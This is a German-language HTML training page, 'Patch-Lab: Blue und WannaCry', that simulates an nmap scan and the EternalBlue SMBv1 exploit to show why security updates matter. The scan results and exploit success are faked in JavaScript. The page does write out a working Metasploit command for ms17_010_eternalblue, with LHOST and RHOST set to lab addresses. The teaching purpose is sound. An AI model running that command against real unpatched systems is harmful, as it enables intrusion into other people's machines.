<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Patch-Lab: Blue und WannaCry</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            margin: 0;
            padding: 20px;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
            background: #fff;
            border-radius: 10px;
            padding: 20px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
        }
        h1, h2 {
            text-align: center;
            color: #007bff;
        }
        .console {
            background: #000;
            color: #0f0;
            font-family: monospace;
            padding: 20px;
            border-radius: 5px;
            height: 300px;
            overflow-y: auto;
            margin-bottom: 20px;
        }
        .btn {
            display: inline-block;
            margin: 10px 5px;
            padding: 10px 20px;
            background: #007bff;
            color: #fff;
            text-align: center;
            border-radius: 5px;
            cursor: pointer;
            text-decoration: none;
        }
        .btn:hover {
            background: #0056b3;
        }
        .btn:disabled {
            background: #ccc;
            cursor: not-allowed;
        }
        .hidden {
            display: none;
        }
        pre {
            background: #f4f4f4;
            padding: 10px;
            border-left: 4px solid #007bff;
            color: #333;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Patch-Lab: Blue und WannaCry</h1>
        <p>
            Im Jahr 2017 führte die Sicherheitslücke <strong>EternalBlue</strong> im SMBv1-Protokoll (Server Message Block, ein Netzwerkprotokoll für Datei- und Druckerfreigaben)
            dazu, dass die Ransomware <strong>WannaCry</strong> weltweit ungepatchte Systeme angreifen konnte. Innerhalb weniger Stunden wurden Millionen Computer infiziert,
            Daten verschlüsselt und Lösegeldforderungen gestellt. Dies hätte durch regelmäßige Sicherheitsupdates verhindert werden können.
        </p>
        <p>
            Dieses Lab zeigt in einer sicheren Umgebung, wie solche Angriffe auf ungepatchte Systeme ablaufen können und warum
            Sicherheitsupdates so entscheidend sind. Du wirst lernen:
        </p>
        <ul>
            <li>Wie Sicherheitslücken wie EternalBlue durch Netzwerkscans entdeckt werden können.</li>
            <li>Wie Angreifer diese Schwachstellen ausnutzen, um sich Zugriff auf Systeme zu verschaffen.</li>
            <li>Welche Schritte notwendig sind, um dich und deine Geräte gegen solche Bedrohungen zu schützen.</li>
        </ul>
        <p>
            Ziel dieses Labs ist es, dir ein besseres Verständnis für die Bedeutung von regelmäßigen Updates zu geben und zu zeigen, wie schnell
            Angreifer ungepatchte Systeme ausnutzen können. Die Simulation wird dabei in drei Schritten durchgeführt:
        </p>
        <ol>
            <li>Ein Netzwerkscan, um potenziell gefährdete Systeme im Netzwerk zu identifizieren.</li>
            <li>Ein Exploit, der die Schwachstelle eines ungepatchten Systems ausnutzt.</li>
            <li>Eine Demonstration, wie Angreifer Zugriff auf sensible Daten erlangen könnten.</li>
        </ol>
        <p>
            Durch diese Simulationen sollst du nicht nur verstehen, wie Angriffe ablaufen, sondern auch, wie du solche Bedrohungen mit einfachen Maßnahmen,
            wie z. B. dem Einspielen von Sicherheitsupdates, verhindern kannst.
        </p>

        <h2>Schritt 1: Netzwerkscan mit Nmap</h2>
        <p>
            Führe einen Netzwerkscan durch, um herauszufinden, welche Geräte im Netzwerk erreichbar sind. Ziel ist es, ein anfälliges System zu identifizieren.
        </p>
        <p>
            Für solche Scans wird häufig ein Tool wie <strong>nmap</strong> verwendet, das gezielt Informationen über Geräte und ihre Schwachstellen im Netzwerk sammeln kann.
            Es ist jedoch wichtig zu beachten, dass der Einsatz von nmap auf fremden IP-Adressen ohne ausdrückliche Genehmigung <strong>illegal</strong> ist und rechtliche Konsequenzen haben kann.
            In diesem Lab wird die Funktionsweise von nmap in einer sicheren, simulierten Umgebung gezeigt.
        </p>

        <pre>
LHOST=192.168.1.100
Ziel IP-Adresse 1=192.168.1.10
Ziel IP-Adresse 2=192.168.1.20
        </pre>
        <div id="step-1" class="step">
            <button class="btn" id="scan-rhost1" onclick="scanIP('RHOST1')">Scan für Ziel IP-Adresse 1 starten</button>
            <button class="btn" id="scan-rhost2" onclick="scanIP('RHOST2')">Scan für Ziel IP-Adresse 2 starten</button>
            <div class="console" id="console-1"></div>
        </div>

        <div id="step-2" class="hidden">
            <h2>Schritt 2: Exploit vorbereiten</h2>
            <p>
                Jetzt greifen wir das anfällige System an. Gib den folgenden Befehl ein und ersetze <code>[RHOST]</code> mit der IP des angreifbaren Systems:
            </p>
            <pre>
msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue; set LHOST 192.168.1.100; set RHOST [RHOST]; run"
            </pre>
            <div class="input-section">
                <input type="text" id="exploit-command" placeholder="Befehl eingeben...">
                <button class="btn" onclick="checkExploit()">Exploit ausführen</button>
            </div>
            <div class="console" id="console-2"></div>
        </div>
    </div>

    <script>
        const scanResults = {};

        function scanIP(target) {
            const console1 = document.getElementById("console-1");
            const button = document.getElementById(target === "RHOST1" ? "scan-rhost1" : "scan-rhost2");

            if (scanResults[target]) {
                console1.innerHTML += `Scan für ${target} wurde bereits durchgeführt.\n`;
                return;
            }

            console1.innerHTML += `Starte Scan für ${target}...\n`;
            setTimeout(() => {
                if (target === "RHOST1") {
                    console1.innerHTML += "192.168.1.10 - Windows 10 (gepatcht, sicher)\nOffene Ports: 80, 443, 3389\n";
                } else if (target === "RHOST2") {
                    console1.innerHTML += "192.168.1.20 - Windows 7 (ungepatcht, anfällig)\nOffene Ports: 80, 445 (SMB), 3389\n";
                }
                scanResults[target] = true;

                // Deaktiviere den Button nach Scan
                button.disabled = true;

                // Öffne Schritt 2 nur bei RHOST2
                if (target === "RHOST2") {
                    document.getElementById("step-2").classList.remove("hidden");
                }
            }, 2000);
        }

        function checkExploit() {
            const input = document.getElementById("exploit-command").value.trim();
            const console2 = document.getElementById("console-2");
            const expectedCommand = 'msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue; set LHOST 192.168.1.100; set RHOST 192.168.1.20; run"';

            if (input === expectedCommand) {
                console2.innerHTML = "Starte Exploit...\n";
                setTimeout(() => {
                    console2.innerHTML += "Exploit erfolgreich. Verbindung mit dem Ziel hergestellt.\n";
                }, 3000);
            } else {
                console2.innerHTML = "Ungültiger Befehl! Überprüfe die Syntax und versuche es erneut.";
            }
        }
    </script>
</body>
</html>


